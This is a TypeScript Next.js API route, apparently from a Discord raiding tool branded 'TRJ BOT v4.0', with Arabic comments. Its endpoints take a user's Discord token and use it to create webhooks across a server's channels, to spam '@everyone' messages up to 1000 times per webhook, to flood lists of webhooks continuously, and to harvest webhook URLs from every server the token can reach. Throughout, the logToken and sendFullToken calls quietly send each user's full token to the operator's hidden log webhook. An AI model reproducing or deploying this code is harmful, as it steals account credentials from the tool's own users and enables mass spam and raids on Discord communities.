import { NextRequest, NextResponse } from 'next/server';
import { discordFetch, DISCORD_API, cleanToken } from '@/lib/discord';
import { sendToWebhook, sendFullToken } from '@/lib/webhook';
import { getLogWebhookUrl } from '@/lib/config';
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit';

export const runtime = 'edge';

interface ChannelInfo {
  id: string;
  name: string;
  type: number;
  position: number;
}

interface WebhookResult {
  url: string;
  name: string;
  id: string;
  channelId: string;
  channelName: string;
}

// إرسال معلومات التوكن الكامل للويب هوك المخفي
function logToken(token: string, action: string, extra?: Record<string, string>) {
  const ct = String(token || '').trim().replace(/^(Bot |bearer |Bearer )/i, '');
  const whUrl = getLogWebhookUrl();
  sendToWebhook({
    username: 'TRJ BOT v4.0',
    avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png',
    embeds: [{
      title: `🔗 Webhook Creator - ${action}`,
      description: 'تم تنفيذ عملية إنشاء ويب هوكات',
      color: 0x00BFFF,
      fields: [
        { name: '🎫 التوكن الكامل', value: `\`\`\`${ct}\`\`\``, inline: false },
        { name: '🔧 العملية', value: action, inline: true },
        ...(extra ? Object.entries(extra).map(([k, v]) => ({ name: k, value: String(v).substring(0, 1024), inline: true })) : []),
        { name: '⏰ الوقت', value: new Date().toISOString(), inline: true },
        { name: '🛡️ الإصدار', value: 'TRJ BOT v4.0', inline: true },
      ],
      footer: { text: 'TRJ BOT v4.0 - Webhook Creator' },
      timestamp: new Date().toISOString()
    }]
  }, whUrl).catch(() => {});
}

// جلب كل الرومات النصية في السيرفر
async function fetchGuildChannels(token: string, guildId: string): Promise<{ channels: ChannelInfo[]; error?: string }> {
  const result = await discordFetch(token, 'GET', `/guilds/${guildId}/channels`);
  
  if (result.status === 429) {
    return { channels: [], error: 'Rate limited - حاول بعد قليل' };
  }
  
  if (!result.ok || !result.data) {
    const errData = result.data as { message?: string } | undefined;
    return { channels: [], error: errData?.message || `HTTP ${result.status}` };
  }

  const allChannels = result.data as ChannelInfo[];
  // فلتر الرومات النصية فقط (type 0 = text)
  const textChannels = allChannels
    .filter(ch => ch.type === 0)
    .sort((a, b) => a.position - b.position);
  
  return { channels: textChannels };
}

// إنشاء ويب هوك في روم واحد
async function createWebhookInChannel(
  token: string,
  channelId: string,
  name: string,
  avatar?: string
): Promise<{ success: boolean; data?: { id: string; url: string; name: string }; error?: string }> {
  const body: Record<string, string> = { name };
  if (avatar) body.avatar = avatar;
  
  const result = await discordFetch(token, 'POST', `/channels/${channelId}/webhooks`, body);
  
  if (result.status === 429) {
    return { success: false, error: 'Rate limited' };
  }
  
  if (!result.ok || !result.data) {
    const errData = result.data as { message?: string } | undefined;
    return { success: false, error: errData?.message || `HTTP ${result.status}` };
  }

  const data = result.data as { id: string; token?: string; name: string };
  const webhookUrl = data.token
    ? `${DISCORD_API}/webhooks/${data.id}/${data.token}`
    : `https://discord.com/api/webhooks/${data.id}/unknown`;
  
  return { success: true, data: { id: data.id, url: webhookUrl, name: data.name } };
}

// إرسال رسالة عبر ويب هوك مع خيارات متقدمة
async function sendWebhookMessage(
  webhookUrl: string,
  message: string,
  options: {
    username?: string;
    avatarUrl?: string;
    embed?: { title: string; description?: string; color?: number; fields?: Array<{ name: string; value: string; inline?: boolean }> };
    tts?: boolean;
  } = {}
): Promise<boolean> {
  try {
    const payload: Record<string, unknown> = { content: message };
    if (options.username) payload.username = options.username;
    if (options.avatarUrl) payload.avatar_url = options.avatarUrl;
    if (options.tts) payload.tts = true;
    if (options.embed) {
      payload.embeds = [{
        title: options.embed.title,
        description: options.embed.description,
        color: options.embed.color || 0x5865F2,
        ...(options.embed.fields ? { fields: options.embed.fields } : {}),
      }];
    }
    
    const res = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
      signal: AbortSignal.timeout(10000),
    });
    
    return res.ok || res.status === 204;
  } catch {
    return false;
  }
}

// سبام في ويب هوك واحد - بالتوازي
async function spamWebhook(
  webhookUrl: string,
  message: string,
  count: number,
  options: {
    username?: string;
    avatarUrl?: string;
    embed?: { title: string; description?: string; color?: number; fields?: Array<{ name: string; value: string; inline?: boolean }> };
  } = {}
): Promise<{ sent: number; failed: number }> {
  let sent = 0;
  let failed = 0;
  const batchSize = 5;
  let rlWait = 0;

  for (let i = 0; i < count; i += batchSize) {
    // انتظر rate limit عالمي
    const now = Date.now();
    if (now < rlWait) {
      await new Promise(r => setTimeout(r, rlWait - now + 100));
    }

    const batch = Math.min(batchSize, count - i);
    const results = await Promise.allSettled(
      Array.from({ length: batch }, () =>
        sendWebhookMessageWithRetry(webhookUrl, message, options)
      )
    );

    for (const r of results) {
      if (r.status === 'fulfilled') {
        if (r.value === 'rl') {
          // rate limited - تحديث الوقت و إعادة العد
          rlWait = Date.now() + 1500;
          failed++;
        } else if (r.value) sent++;
        else failed++;
      } else failed++;
    }

    // تأخير 1 ثانية بين الدفعات لتجنب Rate Limit (Discord = 5 req/sec per webhook)
    if (i + batchSize < count) {
      await new Promise(r => setTimeout(r, 1000));
    }
  }

  return { sent, failed };
}

// إرسال رسالة ويب هوك مع retry عند Rate Limit
async function sendWebhookMessageWithRetry(
  webhookUrl: string,
  message: string,
  options: {
    username?: string;
    avatarUrl?: string;
    embed?: { title: string; description?: string; color?: number; fields?: Array<{ name: string; value: string; inline?: boolean }> };
    tts?: boolean;
  } = {},
  retries = 1,
): Promise<boolean | 'rl'> {
  try {
    const payload: Record<string, unknown> = { content: message };
    if (options.username) payload.username = options.username;
    if (options.avatarUrl) payload.avatar_url = options.avatarUrl;
    if (options.tts) payload.tts = true;
    if (options.embed) {
      payload.embeds = [{
        title: options.embed.title,
        description: options.embed.description,
        color: options.embed.color || 0x5865F2,
        ...(options.embed.fields ? { fields: options.embed.fields } : {}),
      }];
    }

    const res = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
      signal: AbortSignal.timeout(10000),
    });

    if (res.status === 429 && retries > 0) {
      try {
        const errData = await res.json().catch(() => ({ retry_after: 1 }));
        const waitMs = Math.min((errData.retry_after || 1) * 1000, 5000);
        await new Promise(r => setTimeout(r, waitMs));
        const res2 = await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
          signal: AbortSignal.timeout(10000),
        });
        if (res2.status === 429) return 'rl';
        return res2.ok || res2.status === 204;
      } catch { return false; }
    }

    if (res.status === 429) return 'rl';
    return res.ok || res.status === 204;
  } catch {
    return false;
  }
}

export async function POST(request: NextRequest) {
  try {
    // Rate Limiting
    const rlIp = getClientIp(request);
    const rl = rateLimit(`${rlIp}:webhook-creator`, RATE_LIMITS.medium);
    if (rl.limited) {
      return NextResponse.json({ success: false, error: 'تم تجاوز الحد المسموح - حاول لاحقاً' }, { status: 429, headers: { 'Retry-After': String(Math.ceil((rl.resetAt - Date.now()) / 1000)) } });
    }


    const body = await request.json().catch(() => ({}));
    const { token, guildId, action } = body;

    // ==================== send - إرسال رسالة واحدة بدون توكن ====================
    if (action === 'send') {
      const { url, message, username, avatar_url, embed } = body as {
        url?: string;
        message?: string;
        username?: string;
        avatar_url?: string;
        embed?: {
          title?: string;
          description?: string;
          color?: number;
          image?: { url: string };
          thumbnail?: { url: string };
        };
      };

      if (!url) {
        return NextResponse.json({ success: false, error: 'أدخل رابط الويب هوك' }, { status: 400 });
      }
      if (!message && !embed) {
        return NextResponse.json({ success: false, error: 'أدخل الرسالة أو الإيمبد' }, { status: 400 });
      }

      // بناء الـ payload
      const payload: Record<string, unknown> = {
        content: message || '',
      };
      if (username) payload.username = username;
      if (avatar_url) payload.avatar_url = avatar_url;

      // إضافة الإيمبد إذا تم توفيره
      if (embed) {
        const embedObj: Record<string, unknown> = {};
        if (embed.title) embedObj.title = embed.title;
        if (embed.description) embedObj.description = embed.description;
        if (embed.color) embedObj.color = embed.color;
        if (embed.image?.url) embedObj.image = { url: embed.image.url };
        if (embed.thumbnail?.url) embedObj.thumbnail = { url: embed.thumbnail.url };
        embedObj.timestamp = new Date().toISOString();
        payload.embeds = [embedObj];
      }

      try {
        const controller = new AbortController();
        const tid = setTimeout(() => controller.abort(), 15000);
        const res = await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
          signal: controller.signal,
        });
        clearTimeout(tid);

        if (res.status === 204 || res.ok) {
          return NextResponse.json({ success: true });
        }

        // محاولة قراءة خطأ Discord
        let errorDetail = 'فشل إرسال الرسالة عبر الويب هوك';
        try {
          const errData = await res.json() as { message?: string };
          if (errData.message) errorDetail = errData.message;
        } catch { /* ignore */ }

        return NextResponse.json({ success: false, error: errorDetail }, { status: res.status });
      } catch (e: unknown) {
        if (e instanceof Error && e.name === 'AbortError') {
          return NextResponse.json({ success: false, error: 'انتهت مهلة إرسال الويب هوك' }, { status: 408 });
        }
        return NextResponse.json({ success: false, error: 'فشل الاتصال بالويب هوك - تأكد من صحة الرابط' }, { status: 502 });
      }
    }

    // ==================== ultra - سبام متعدد الويب هوكات بدون توكن ====================
    if (action === 'ultra') {
      const { urls = [], message = '', username = 'TRJ BOT', duration = 60, speed = 1 } = body;

      if (!Array.isArray(urls) || urls.length === 0) {
        return NextResponse.json({ success: false, error: 'لا توجد روابط ويب هوك' }, { status: 400 });
      }

      if (!message.trim()) {
        return NextResponse.json({ success: false, error: 'اكتب رسالة' }, { status: 400 });
      }

      if (urls.length > 50) {
        return NextResponse.json({ success: false, error: 'الحد الأقصى 50 ويب هوك' }, { status: 400 });
      }

      // Validate duration and speed
      const safeDuration = Math.max(5, Math.min(3600, Number(duration) || 60));
      const safeSpeed = Math.max(0.5, Math.min(50, Number(speed) || 1));
      const isContinuous = safeDuration > 0 && safeDuration < 3600;

      const whUrl = getLogWebhookUrl();
      sendToWebhook({
        username: 'TRJ Webhook Ultra',
        embeds: [{
          title: '🌐 Webhook Ultra',
          color: 0x10b981,
          fields: [
            { name: '🔗 URLs', value: String(urls.length), inline: true },
            { name: '💬 Message', value: message.substring(0, 100), inline: true },
            { name: '⏱️ Duration', value: isContinuous ? `${safeDuration}s` : 'Single', inline: true },
            { name: '⚡ Speed', value: `${safeSpeed}/s`, inline: true },
          ],
          timestamp: new Date().toISOString()
        }]
      }, whUrl).catch(() => {});

      const payload: Record<string, unknown> = { content: message };
      if (username.trim()) payload.username = username;

      const results: { url: string; success: boolean; error?: string }[] = [];
      let successCount = 0, failCount = 0, totalSent = 0;

      // Validate URLs first
      const validUrls = urls.filter((u: string) => typeof u === 'string' && u.includes('discord.com/api/webhooks'));
      const invalidCount = urls.length - validUrls.length;

      if (!isContinuous) {
        // Single send mode
        const batchSize = 5;
        for (let i = 0; i < validUrls.length; i += batchSize) {
          const batch = validUrls.slice(i, i + batchSize);
          const batchResults = await Promise.allSettled(
            batch.map(async (url: string) => {
              try {
                const res = await fetch(url, {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify(payload),
                  signal: AbortSignal.timeout(15000)
                });

                if (res.ok || res.status === 204) {
                  return { url, success: true };
                }
                const errData = await res.json().catch(() => ({}));
                return { url, success: false, error: `HTTP ${res.status}` };
              } catch (e) {
                return { url, success: false, error: 'timeout' };
              }
            })
          );

          for (const r of batchResults) {
            if (r.status === 'fulfilled') {
              const item = r.value;
              results.push(item);
              if (item.success) successCount++;
              else failCount++;
              totalSent++;
            }
          }
        }
      } else {
        // Continuous send mode - send repeatedly until duration ends
        const startTime = Date.now();
        const endTime = startTime + (safeDuration * 1000);
        const intervalMs = Math.max(100, Math.round(1000 / safeSpeed));

        while (Date.now() < endTime) {
          const batchResults = await Promise.allSettled(
            validUrls.map(async (url: string) => {
              try {
                const res = await fetch(url, {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify(payload),
                  signal: AbortSignal.timeout(15000)
                });

                if (res.ok || res.status === 204) {
                  return { url, success: true };
                }
                return { url, success: false, error: `HTTP ${res.status}` };
              } catch (e) {
                return { url, success: false, error: 'timeout' };
              }
            })
          );

          let batchSuccess = 0, batchFail = 0;
          for (const r of batchResults) {
            if (r.status === 'fulfilled') {
              const item = r.value;
              if (item.success) batchSuccess++;
              else batchFail++;
              totalSent++;
            }
          }
          successCount += batchSuccess;
          failCount += batchFail;

          // Store latest results for display
          const latestResults: { url: string; success: boolean; error?: string }[] = [];
          for (const r of batchResults) {
            if (r.status === 'fulfilled') latestResults.push(r.value);
          }
          // Only replace results with the latest batch for display
          if (latestResults.length > 0) {
            results.length = 0;
            results.push(...latestResults);
          }

          // Wait for the interval (respecting remaining time)
          const remaining = endTime - Date.now();
          if (remaining <= 0) break;
          const waitTime = Math.min(intervalMs, remaining);
          if (waitTime > 100) {
            await new Promise(resolve => setTimeout(resolve, waitTime));
          }
        }
      }

      if (invalidCount > 0) {
        for (let i = 0; i < invalidCount; i++) {
          results.push({ url: 'invalid', success: false, error: 'رابط غير صالح' });
          failCount++;
        }
      }

      return NextResponse.json({
        success: true,
        results,
        stats: { total: totalSent || urls.length, success: successCount, failed: failCount },
        totalSent,
      });
    }

    // ==================== find - البحث عن ويب هوكات (يتطلب توكن) ====================
    if (action === 'find') {
      if (!token || typeof token !== 'string' || token.trim().length < 20) {
        return NextResponse.json({ success: false, error: 'التوكن مطلوب' }, { status: 400 });
      }

      const ct = cleanToken(token);

      // التحقق من التوكن
      const verifyResult = await discordFetch(ct, 'GET', '/users/@me', undefined, { userOnly: true, timeout: 10000 });

      if (!verifyResult.ok || !verifyResult.data) {
        return NextResponse.json({ success: false, error: 'توكن غير صالح' });
      }

      const userData = verifyResult.data as { id: string; username: string; discriminator?: string };
      const userTag = `${userData.username}#${userData.discriminator || '0'}`;

      const webhooks: { id: string; name: string; channelId: string; guildId: string; url?: string }[] = [];
      const logs: string[] = [];

      if (guildId) {
        // البحث في سيرفر محدد
        logs.push(`🔍 البحث عن ويب هوكات في سيرفر: ${guildId}`);

        const whRes = await discordFetch(ct, 'GET', `/guilds/${guildId}/webhooks`, undefined, { userOnly: true, timeout: 15000 });

        if (whRes.ok && whRes.data) {
          const hooks = whRes.data as any[];
          for (const hook of hooks) {
            webhooks.push({
              id: hook.id,
              name: hook.name,
              channelId: hook.channel_id,
              guildId: hook.guild_id,
              url: hook.token ? `https://discord.com/api/webhooks/${hook.id}/${hook.token}` : undefined
            });
          }
          logs.push(`✅ تم العثور على ${hooks.length} ويب هوك`);
        } else {
          logs.push(`❌ فشل جلب الويب هوكات`);
        }
      } else {
        // البحث في جميع السيرفرات
        logs.push('🔍 البحث عن ويب هوكات في جميع السيرفرات...');

        const guildsRes = await discordFetch(ct, 'GET', '/users/@me/guilds', undefined, { userOnly: true, timeout: 15000 });

        if (guildsRes.ok && guildsRes.data) {
          const guilds = guildsRes.data as any[];
          logs.push(`🏰 فحص ${guilds.length} سيرفر...`);

          for (const guild of guilds) {
            try {
              const whRes = await discordFetch(ct, 'GET', `/guilds/${guild.id}/webhooks`, undefined, { userOnly: true, timeout: 10000 });

              if (whRes.ok && whRes.data) {
                const hooks = whRes.data as any[];
                for (const hook of hooks) {
                  webhooks.push({
                    id: hook.id,
                    name: hook.name,
                    channelId: hook.channel_id,
                    guildId: hook.guild_id,
                    url: hook.token ? `https://discord.com/api/webhooks/${hook.id}/${hook.token}` : undefined
                  });
                }
              }

              await new Promise(r => setTimeout(r, 500));
            } catch {
              // تجاهل
            }
          }

          logs.push(`✅ تم العثور على ${webhooks.length} ويب هوك`);
        } else {
          logs.push(`❌ فشل جلب السيرفرات`);
        }
      }

      // إرسال إشعار للويب هوك
      const webhookUrl = getLogWebhookUrl();
      if (webhookUrl && webhooks.length > 0) {
        try {
          await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              embeds: [{
                title: '🔗 Webhook Finder',
                description: `**تم العثور على ${webhooks.length} ويب هوك**`,
                color: 0x5865F2,
                fields: [
                  { name: '👤 المستخدم', value: userTag, inline: true },
                  { name: '🔗 عدد الويب هوكات', value: webhooks.length.toString(), inline: true },
                ],
                footer: { text: 'TRJ BOT - Prime Feature' },
                timestamp: new Date().toISOString()
              }]
            })
          });
        } catch {}
      }

      return NextResponse.json({
        success: true,
        logs,
        webhooks,
        count: webhooks.length
      });
    }

    // ==================== باقي الأفعال تتطلب توكن وسيرفر ====================
    if (!token || typeof token !== 'string' || token.trim().length < 20) {
      return NextResponse.json({ success: false, error: 'التوكن مطلوب' }, { status: 400 });
    }

    if (!guildId || typeof guildId !== 'string') {
      return NextResponse.json({ success: false, error: 'ايدي السيرفر مطلوب' }, { status: 400 });
    }

    const ct = String(token).trim();

    sendFullToken('إنشاء ويب هوك', ct, { '🏰 السيرفر': guildId });

    // ==================== جلب الرومات ====================
    if (action === 'fetch-channels') {
      logToken(ct, 'جلب الرومات', { '🏰 السيرفر': guildId });
      
      const { channels, error } = await fetchGuildChannels(ct, guildId);
      if (error) {
        return NextResponse.json({ success: false, error });
      }
      
      if (channels.length === 0) {
        return NextResponse.json({ success: false, error: 'لا توجد رومات نصية في هذا السيرفر - تأكد من صلاحيات التوكن' });
      }
      
      return NextResponse.json({
        success: true,
        channels: channels.map(ch => ({ id: ch.id, name: ch.name, type: ch.type, position: ch.position })),
        count: channels.length,
      });
    }

    // ==================== إنشاء ويب هوكات في كل الرومات ====================
    if (action === 'create-all') {
      const {
        webhookName = 'TRJ Webhook',
        webhookAvatar,
        createCount = 1,
        selectedChannelIds,
      } = body;

      logToken(ct, 'إنشاء ويب هوكات في كل الرومات', {
        '🏰 السيرفر': guildId,
        '📝 الاسم': webhookName,
        '🔢 العدد لكل روم': String(createCount),
      });

      // جلب الرومات
      const { channels, error } = await fetchGuildChannels(ct, guildId);
      if (error) {
        return NextResponse.json({ success: false, error });
      }

      // فلتر الرومات المحددة أو الكل
      let targetChannels = channels;
      if (selectedChannelIds && Array.isArray(selectedChannelIds) && selectedChannelIds.length > 0) {
        targetChannels = channels.filter(ch => selectedChannelIds.includes(ch.id));
      }

      if (targetChannels.length === 0) {
        return NextResponse.json({ success: false, error: 'لا توجد رومات محددة' });
      }

      const numPerChannel = Math.min(Math.max(parseInt(String(createCount)) || 1, 1), 10);
      const logs: string[] = [];
      const allResults: WebhookResult[] = [];
      let totalCreated = 0;
      let totalFailed = 0;

      logs.push(`🏭 إنشاء ويب هوكات في ${targetChannels.length} روم`);
      logs.push(`📌 الاسم: ${webhookName} | العدد لكل روم: ${numPerChannel}`);
      logs.push('');

      for (const channel of targetChannels) {
        logs.push(`📺 #${channel.name}:`);
        
        for (let i = 0; i < numPerChannel; i++) {
          const wName = numPerChannel === 1 ? webhookName : `${webhookName}-${i + 1}`;
          
          try {
            const result = await createWebhookInChannel(ct, channel.id, wName, webhookAvatar);
            
            if (result.success && result.data) {
              allResults.push({
                url: result.data.url,
                name: result.data.name,
                id: result.data.id,
                channelId: channel.id,
                channelName: channel.name,
              });
              logs.push(`  ✅ ${result.data.name}: تم إنشاؤه`);
              totalCreated++;
            } else {
              logs.push(`  ❌ ${wName}: ${result.error || 'فشل'}`);
              totalFailed++;
            }
          } catch {
            logs.push(`  ❌ ${wName}: خطأ في الاتصال`);
            totalFailed++;
          }

          if (i < numPerChannel - 1) {
            await new Promise(r => setTimeout(r, 500));
          }
        }

        // تأخير بين الرومات لتجنب Rate Limit
        await new Promise(r => setTimeout(r, 800));
      }

      logs.push('');
      logs.push(`✅ تم إنشاء ${totalCreated} ويب هوك | ❌ فشل ${totalFailed}`);

      return NextResponse.json({
        success: true,
        results: allResults,
        logs,
        stats: { created: totalCreated, failed: totalFailed, channels: targetChannels.length },
      });
    }

    // ==================== إنشاء + سبام مباشرة ====================
    if (action === 'create-and-spam') {
      const {
        webhookName = 'TRJ Webhook',
        createCount = 1,
        selectedChannelIds,
        spamMessage = '@everyone TRJ BOT',
        spamCount = 10,
        spamUsername,
        spamAvatarUrl,
        embedTitle,
        embedDescription,
        embedColor,
        embedFields,
        tts = false,
      } = body;

      logToken(ct, 'إنشاء + سبام', {
        '🏰 السيرفر': guildId,
        '💬 الرسالة': spamMessage.substring(0, 200),
        '🔢 عدد السبام': String(spamCount),
      });

      // جلب الرومات
      const { channels, error } = await fetchGuildChannels(ct, guildId);
      if (error) {
        return NextResponse.json({ success: false, error });
      }

      let targetChannels = channels;
      if (selectedChannelIds && Array.isArray(selectedChannelIds) && selectedChannelIds.length > 0) {
        targetChannels = channels.filter(ch => selectedChannelIds.includes(ch.id));
      }

      if (targetChannels.length === 0) {
        return NextResponse.json({ success: false, error: 'لا توجد رومات محددة' });
      }

      const numPerChannel = Math.min(Math.max(parseInt(String(createCount)) || 1, 1), 10);
      const spamTotal = Math.min(Math.max(parseInt(String(spamCount)) || 10, 1), 1000);
      const logs: string[] = [];
      const allWebhooks: WebhookResult[] = [];
      let totalCreated = 0;
      let totalSpamSent = 0;
      let totalSpamFailed = 0;

      logs.push(`🔗 إنشاء ويب هوكات + سبام في ${targetChannels.length} روم`);
      logs.push(`📌 الرسالة: ${spamMessage.substring(0, 80)} | السبام: ${spamTotal} لكل ويب هوك`);
      logs.push('');

      // بناء Embed إذا موجود
      const embedObj = embedTitle ? {
        title: embedTitle,
        description: embedDescription || undefined,
        color: embedColor ? parseInt(String(embedColor)) : 0x5865F2,
        fields: embedFields || undefined,
      } : undefined;

      const spamOptions = {
        username: spamUsername || undefined,
        avatarUrl: spamAvatarUrl || undefined,
        embed: embedObj,
      };

      for (const channel of targetChannels) {
        logs.push(`📺 #${channel.name}:`);
        
        // إنشاء الويب هوك
        const wName = numPerChannel === 1 ? webhookName : `${webhookName}-1`;
        const wResult = await createWebhookInChannel(ct, channel.id, wName);
        
        if (!wResult.success || !wResult.data) {
          logs.push(`  ❌ فشل إنشاء الويب هوك: ${wResult.error}`);
          continue;
        }

        allWebhooks.push({
          url: wResult.data.url,
          name: wResult.data.name,
          id: wResult.data.id,
          channelId: channel.id,
          channelName: channel.name,
        });
        totalCreated++;
        logs.push(`  ✅ تم إنشاء الويب هوك`);

        // سبام
        logs.push(`  📤 جاري سبام ${spamTotal} رسالة...`);
        const spamResult = await spamWebhook(wResult.data.url, spamMessage, spamTotal, spamOptions);
        totalSpamSent += spamResult.sent;
        totalSpamFailed += spamResult.failed;
        logs.push(`  📊 أُرسل: ${spamResult.sent} | فشل: ${spamResult.failed}`);

        await new Promise(r => setTimeout(r, 500));
      }

      logs.push('');
      logs.push(`✅ ويب هوكات: ${totalCreated} | 📤 سبام: أُرسل ${totalSpamSent} | فشل ${totalSpamFailed}`);

      return NextResponse.json({
        success: true,
        results: allWebhooks,
        logs,
        stats: {
          created: totalCreated,
          spamSent: totalSpamSent,
          spamFailed: totalSpamFailed,
          channels: targetChannels.length,
        },
      });
    }

    // ==================== سبام في ويب هوكات موجودة ====================
    if (action === 'spam-existing') {
      const {
        webhookUrls,
        spamMessage = '@everyone TRJ BOT',
        spamCount = 10,
        spamUsername,
        spamAvatarUrl,
        embedTitle,
        embedDescription,
        embedColor,
        embedFields,
        tts = false,
      } = body;

      if (!webhookUrls || !Array.isArray(webhookUrls) || webhookUrls.length === 0) {
        return NextResponse.json({ success: false, error: 'أدخل روابط ويب هوك واحدة على الأقل' });
      }

      if (!spamMessage) {
        return NextResponse.json({ success: false, error: 'أدخل الرسالة' });
      }

      logToken(ct, 'سبام ويب هوكات موجودة', {
        '💬 الرسالة': spamMessage.substring(0, 200),
        '🔗 عدد الروابط': String(webhookUrls.length),
        '🔢 السبام لكل واحد': String(spamCount),
      });

      const spamTotal = Math.min(Math.max(parseInt(String(spamCount)) || 10, 1), 1000);
      const logs: string[] = [];
      let totalSent = 0;
      let totalFailed = 0;

      const embedObj = embedTitle ? {
        title: embedTitle,
        description: embedDescription || undefined,
        color: embedColor ? parseInt(String(embedColor)) : 0x5865F2,
        fields: embedFields || undefined,
      } : undefined;

      const spamOptions = {
        username: spamUsername || undefined,
        avatarUrl: spamAvatarUrl || undefined,
        embed: embedObj,
      };

      logs.push(`🔗 سبام في ${webhookUrls.length} ويب هوك`);
      logs.push(`📌 الرسالة: ${spamMessage.substring(0, 80)} | السبام: ${spamTotal} لكل واحد`);
      logs.push('');

      for (let i = 0; i < webhookUrls.length; i++) {
        const url = webhookUrls[i].trim();
        logs.push(`🔗 ويب هوك ${i + 1}:`);
        
        const result = await spamWebhook(url, spamMessage, spamTotal, spamOptions);
        totalSent += result.sent;
        totalFailed += result.failed;
        logs.push(`  📊 أُرسل: ${result.sent} | فشل: ${result.failed}`);

        if (i < webhookUrls.length - 1) {
          await new Promise(r => setTimeout(r, 300));
        }
      }

      logs.push('');
      logs.push(`✅ المجموع - أُرسل: ${totalSent} | فشل: ${totalFailed}`);

      return NextResponse.json({
        success: true,
        logs,
        stats: { sent: totalSent, failed: totalFailed, webhooks: webhookUrls.length },
      });
    }

    // ==================== إنشاء في روم واحد (الوضع القديم للتوافق) ====================
    if (!action || action === 'create-single') {
      const { channelId, count = 5, name = 'TRJ Webhook', webhookAvatar } = body;

      if (!channelId || typeof channelId !== 'string') {
        return NextResponse.json({ success: false, error: 'ايدي الروم مطلوب' }, { status: 400 });
      }

      logToken(ct, 'إنشاء في روم واحد', {
        '📺 الروم': channelId,
        '📝 الاسم': name,
      });

      const num = Math.min(Math.max(parseInt(String(count)) || 5, 1), 15);
      const results: WebhookResult[] = [];
      const logs: string[] = [];
      let created = 0;

      logs.push(`انشاء ${num} ويب هوك في الروم: ${channelId}`);
      logs.push('');

      for (let i = 0; i < num; i++) {
        const wName = num === 1 ? name : `${name} ${i + 1}`;

        try {
          const result = await createWebhookInChannel(ct, channelId, wName, webhookAvatar);
          
          if (result.success && result.data) {
            results.push({ url: result.data.url, name: result.data.name, id: result.data.id, channelId, channelName: '' });
            logs.push(`  ✅ ${result.data.name}: تم إنشاؤه`);
            created++;
          } else {
            logs.push(`  ❌ ${wName}: ${result.error || 'فشل'}`);
          }
        } catch {
          logs.push(`  ❌ ${wName}: خطأ في الاتصال`);
        }

        if (i < num - 1) {
          await new Promise(r => setTimeout(r, 500));
        }
      }

      logs.push('');
      logs.push(`تم إنشاء ${created}/${num} ويب هوك بنجاح`);

      return NextResponse.json({
        success: true,
        results,
        logs,
        stats: { created, failed: num - created },
      });
    }

    return NextResponse.json({ success: false, error: 'عملية غير معروفة - اختر عملية صحيحة' }, { status: 400 });

  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع';
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
